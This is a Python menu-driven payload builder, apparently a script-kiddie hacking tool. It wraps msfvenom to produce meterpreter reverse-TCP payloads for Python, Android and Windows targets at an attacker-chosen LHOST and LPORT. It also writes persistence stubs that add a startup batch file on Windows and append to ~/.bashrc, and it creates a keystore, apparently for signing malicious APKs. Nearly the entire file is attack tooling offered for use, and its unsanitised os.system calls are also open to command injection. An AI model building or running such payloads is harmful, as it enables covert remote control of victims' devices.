import os
import subprocess

def banner():
    print("=" * 50)
    print(" " * 15 + "BY MahmoudXxXxXxx")
    print(" " * 20 + "VIP")
    print("=" * 50)

def check_msfvenom():
    if not os.path.exists("./tools/msfvenom"):
        print("[!] msfvenom not found in ./tools directory.")
        print("[!] Please ensure msfvenom is placed in the tools directory.")
        exit()

def create_payload_with_msfvenom():
    while True:
        print("\n[1] Python Payload")
        print("[2] Android Payload")
        print("[3] Windows Payload (32-bit)")
        print("[4] Windows Payload (64-bit)")
        print("[5] Back to Main Menu")
        choice = input("[*] Select payload type: ").strip()

        if choice == "1":
            name = input("[*] Enter base name for the payload (e.g., payload): ").strip()
            name += ".py"
            ip = input("[*] Enter LHOST: ").strip()
            port = input("[*] Enter LPORT: ").strip()
            os.system(f"./tools/msfvenom -p python/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -o {name}")
            print(f"[*] Python payload created: {name}")
        elif choice == "2":
            name = input("[*] Enter base name for the payload (e.g., payload): ").strip()
            name += ".apk"
            ip = input("[*] Enter LHOST: ").strip()
            port = input("[*] Enter LPORT: ").strip()
            os.system(f"./tools/msfvenom -p android/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -o {name}")
            print(f"[*] Android payload created: {name}")
        elif choice == "3":
            name = input("[*] Enter base name for the payload (e.g., payload): ").strip()
            name += ".exe"
            ip = input("[*] Enter LHOST: ").strip()
            port = input("[*] Enter LPORT: ").strip()
            os.system(f"./tools/msfvenom -p windows/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -a x86 --platform windows -o {name}")
            print(f"[*] Windows 32-bit payload created: {name}")
        elif choice == "4":
            name = input("[*] Enter base name for the payload (e.g., payload): ").strip()
            name += ".exe"
            ip = input("[*] Enter LHOST: ").strip()
            port = input("[*] Enter LPORT: ").strip()
            os.system(f"./tools/msfvenom -p windows/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -a x64 --platform windows -o {name}")
            print(f"[*] Windows 64-bit payload created: {name}")
        elif choice == "5":
            break
        else:
            print("[!] Invalid choice. Please try again.")

def create_vip_payload():
    while True:
        print("\n[1] Python VIP Payload")
        print("[2] Bash VIP Payload")
        print("[3] Back to Main Menu")
        choice = input("[*] Select VIP payload type: ").strip()

        if choice == "1":
            name = input("[*] Enter base name for the payload (e.g., vip_payload): ").strip()
            name += ".py"
            payload_code = """
import socket
import subprocess
import os
import platform

def add_to_startup():
    try:
        if platform.system() == "Windows":
            startup_folder = os.getenv('APPDATA') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
            file_path = startup_folder + "payload.bat"
            with open(file_path, 'w') as file:
                file.write("python payload.py")
        return "[*] Payload added to startup."
    except Exception as e:
        return f"Error: {e}"

add_to_startup()
            """
            with open(name, "w") as file:
                file.write(payload_code)
            print(f"[*] Python VIP payload created: {name}")
        elif choice == "2":
            name = input("[*] Enter base name for the payload (e.g., vip_payload): ").strip()
            name += ".sh"
            payload_code = """
#!/bin/bash
echo "bash script to maintain persistence" >> ~/.bashrc
            """
            with open(name, "w") as file:
                file.write(payload_code)
            print(f"[*] Bash VIP payload created: {name}")
        elif choice == "3":
            break
        else:
            print("[!] Invalid choice. Please try again.")

def create_apk_keystore():
    output_file = input("[*] Enter base name for the keystore file (e.g., my-release-key): ").strip()
    output_file += ".keystore"
    alias = input("[*] Enter alias name: ").strip()
    password = input("[*] Enter keystore and key password: ").strip()
    command = f"keytool -genkey -v -keystore {output_file} -keyalg RSA -keysize 2048 -validity 10000 -alias {alias} -storepass {password} -keypass {password}"
    os.system(command)
    print(f"[*] Keystore created: {output_file}")


def main():
    check_msfvenom()
    while True:
        banner()
        print("\n[1] Create Payloads")
        print("[2] Create APK Keystore")
        print("[3] Exit")
        choice = input("[*] Select an option: ").strip()

        if choice == "1":
            while True:
                print("\n[1] Create Payloads using msfvenom")
                print("[2] Create VIP Payloads")
                print("[3] Back to Main Menu")
                sub_choice = input("[*] Select an option: ").strip()

                if sub_choice == "1":
                    create_payload_with_msfvenom()
                elif sub_choice == "2":
                    create_vip_payload()
                elif sub_choice == "3":
                    break
                else:
                    print("[!] Invalid choice. Please try again.")

        elif choice == "2":
            create_apk_keystore()
        elif choice == "3":
            print("[*] Exiting. Goodbye!")
            break
        else:
            print("[!] Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
